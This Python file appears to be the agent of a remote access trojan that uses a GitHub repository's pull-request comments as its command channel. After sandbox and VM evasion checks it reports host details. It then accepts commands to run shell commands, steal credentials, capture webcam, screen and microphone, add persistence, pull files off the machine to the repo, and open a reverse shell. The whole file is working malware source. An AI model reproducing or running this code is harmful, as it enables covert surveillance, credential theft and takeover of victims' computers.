
import os
import subprocess as sp
import requests
import random
from cv2 import VideoCapture
from cv2 import imwrite
from scipy.io.wavfile import write
from sounddevice import rec, wait
import platform
import re
from urllib.request import Request, urlopen
from urllib.parse import urlparse
import pyautogui
from datetime import datetime
import shutil
import sys
from multiprocessing import Process
import threading
import json
import ctypes
from ctypes.wintypes import HKEY
import time
from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
import win32api
import win32process
import psutil
import win32pdh
from winreg import *
from ctypes import *
import string
from libraries import credentials,sandboxevasion,disctopia
from github import Github

# Authentication with personal access token
g = Github("{TOKEN}")
repo_link = "{REPO}"
parsed_link = urlparse(repo_link)
# Split the path into its components and extract the owner and repository
path_components = parsed_link.path.split('/')
repo_owner = path_components[1]
repo_name = path_components[2]

repo = g.get_user(repo_owner).get_repo(repo_name)


def send_file(file_path, type):
    try:
        with open(file_path, 'rb') as file:
            file_contents = file.read()
        now = datetime.now()
        repo.create_file(f"{type}-{now.strftime('%d-%m-%Y-%H:%M:%S')}.{get_file_extension(file_path)}", "File added", file_contents)
        return True
    except Exception as e:
        return e
    
def get_file_extension(file_path):
    root, extension = os.path.splitext(file_path)
    extension = re.sub(r'^\.', '', extension)
    return extension


def start():
    repo = g.get_user(repo_owner).get_repo(repo_name)
    base_branch = "main"
    branch_name = "feature-" + ''.join(random.choice(string.ascii_lowercase) for i in range(6))
    head_branch = repo.create_git_ref(ref=f"refs/heads/{branch_name}", sha=repo.get_branch(base_branch).commit.sha)

    file_name = "random_file.txt"
    file_content = "This is a random file."
    file_path = f"{branch_name}/{file_name}"
    commit_message = "Add random file"
    repo.create_file(file_path, commit_message, file_content, branch=branch_name)

    title = f"Agent#{ID}"
    now = datetime.now()
    body = f"{MSG} Time: {now.strftime('%d/%m/%Y %H:%M:%S')}\nIP: {disctopia.getIP()}\nBits: {disctopia.getBits()}\nHostname: {disctopia.getHostname()}\nOS: {disctopia.getOS()}\nUsername: {disctopia.getUsername()}\nCPU: {disctopia.getCPU()}\nAdmin: {disctopia.isAdmin()}\nVM: {disctopia.isVM()}"
    pr = repo.create_pull(title=title, body=body, head=head_branch.ref, base=base_branch)

    while True:
        comments = pr.get_issue_comments().get_page(0)
        if comments:
            latest_comment = comments[-1]
            options = latest_comment.body.split() 
            command = options[0]
            
            if command == "cmd":
                if len(options) > 1:
                    pr.create_issue_comment(f"```{disctopia.cmd(' '.join(options[1:]))}```")
                else:
                    pr.create_issue_comment(f"Make sure you add required arguments: cmd #command#")
            
            elif command == "cd":
                if len(options) > 1:
                    result = disctopia.cd(' '.join(options[1:]))
                    if result:
                        pr.create_issue_comment(f"Succesfully changed directory")
                    else:
                        pr.create_issue_comment(f"Failed to change directory")
                else:
                    pr.create_issue_comment(f"Make sure you add required arguments: cd #directory#")

            elif command == "webshot":
                result = disctopia.webshot()
                if result != False:
                    send_file(result, "webshot")
                    pr.create_issue_comment(f"Succesfully uploaded file")
                    os.remove(result)
                else:
                    pr.create_issue_comment(f"Failed to take webcam shot")

            elif command == "process":
                result = disctopia.process()
                pr.create_issue_comment(f"```{result}```")

            elif command == "upload":
                if len(options) > 2:
                    url = options[1]
                    name = ' '.join(options[2:])
                    result = disctopia.upload(url, name)
                    if result:
                        reply = "File uploaded successfully"
                    else:
                        reply = f"Error while trying to upload the file:\n{result}"
                    pr.create_issue_comment(reply)
                else:
                    pr.create_issue_comment(f"Make sure you add required arguments: upload #url# #name#")
            
            elif command == "screenshot":
                result = disctopia.screenshot()
                if result != False:
                    send_file(result, "screenshot")
                    pr.create_issue_comment(f"Succesfully uploaded screenshot")
                    os.remove(result)
                else:
                    pr.create_issue_comment(f"Failed to take screenshot")

            elif command == "creds":
                result = disctopia.creds()
                if result != False:
                    send_file(result, "creds")        
                    pr.create_issue_comment(f"Succesfully uploaded credentials")          
                    os.remove(result)
                else:
                    pr.create_issue_comment(f"Failed to get credentials")

            elif command == "persistent":
                result = disctopia.persistent()
                if result:
                    pr.create_issue_comment(f"Persistence added successfully")

                else:
                    pr.create_issue_comment(f"Error while trying to add persistence:\n{result}")

            elif command == "ls":
                pr.create.issue_comment(f"Agent#{ID} IP: {disctopia.getIP()}")

            elif command == "download":
                if len(options) > 1:
                    path = ' '.join(options[1:])
                    if (send_file(path, "download")):
                        pr.create_issue_comment(f"Succesfully download file") 
                    else:
                        pr.create_issue_comment(f"Failed to download file: {path}")
                else:
                    pr.create_issue_comment(f"Make sure you add required arguments: download #path#")
            
            elif command == "terminate":
                pr.create_issue_comment(f"Agent#{ID} Terminated")
                sys.exit()

            elif command == "selfdestruct":
                result = disctopia.selfdestruct()
                if result:
                    pr.create_issue_comment(f"Agent#{ID} destroyed successfully")
                    sys.exit()
                else:
                    pr.create_issue_comment(f"Error while trying to destroy the agent:\n{result}")

            elif command == "location":
                response = disctopia.location()
                if response != False:
                    reply = f"""```
                    IP Based Location on Agent#{ID}
                    IP: {response.json()['YourFuckingIPAddress']}
                    Hostname: {response.json()['YourFuckingHostname']}
                    City: {response.json()['YourFuckingLocation']}
                    Country: {response.json()['YourFuckingCountryCode']}
                    ISP: {response.json()['YourFuckingISP']}
                    ```"""
                    pr.create_issue_comment(reply)

                else:
                    pr.create_issue_comment("Error while trying to get location")
                         
            elif command == "revshell":
                if len(options) > 2:
                    ip = options[1]
                    port = ' '.join(options[2:])
                    result = disctopia.revshell(ip, port)
                    if result:
                        pr.create_issue_comment("Attempting to establish a reverse shell")
                else:
                    pr.create_issue_comment("Please specify all the required parameters: revshell <ip> <port>")

            elif command == "recordmic":
                if len(options) > 1:
                    interval = ' '.join(options[1:])
                    result = disctopia.recordmic(interval)
                    if result != False:
                        send_file(result,"micrecord")
                        pr.create_issue_comment("Succesfully uploaded the microphone recording")
                        os.remove(result)
                    else:
                        pr.create_issue_comment("Error while trying to record the microphone")
                else:
                    pr.create_issue_comment("Please specify all the required parameters: recordmic <interval>")

            elif command == "wallpaper":
                if len(options) > 1:
                    url = ' '.join(options[1:])
                    result = disctopia.wallpaper(url)
                    if result:
                        pr.create_issue_comment("Wallpaper changed successfully")
                    else:
                        pr.create_issue_comment(f"Error while trying to change the wallpaper:\n{result}")
                else:
                    pr.create_issue_comment("Please specify all the required parameters: wallpaper <url/path>")

            elif command == "killproc":
                if len(options) > 1:
                    pid = ' '.join(options[1:])
                    result = disctopia.killproc(pid)
                    if result:
                        pr.create_issue_comment("Process killed successfully")
                    else:
                        pr.create_issue_commentf("Error while trying to kill the process:\n{result}")
                else:
                    pr.create_issue_comment("Please specify all the required parameters: killproc <pid>")

            elif command == "help":
                pr.create_issue_comment(f"""```
                Agent#{ID} Commands:
                cmd <command> - Run command on target
                cd <path> - Change directory
                webshot - Take a picture from the webcam
                process - List processes
                upload <url> <name> - Upload a file from a URL
                screenshot - Take a screenshot
                creds - Get credentials
                persistent - Add persistence
                ls - List agents
                download <path> - Download a file
                terminate - Terminate the agent
                selfdestruct - Destroy the agent
                location - Get location
                revshell <ip> <port> - Establish a reverse shell
                recordmic <interval> - Record the microphone
                wallpaper <url/path> - Change the wallpaper
                killproc <pid> - Kill a process
                help - Show this message
                ```""")
        time.sleep(1)

if sandboxevasion.test() == True and disctopia.isVM() == False:
    config = disctopia.createConfig()
    ID = disctopia.id()
    if config:
        MSG = f"New Agent Online #{ID}"
        COLOR = 0x00ff00
    else:
        MSG =f"Agent Online #{ID}"
        COLOR = 0x0000FF

    start()

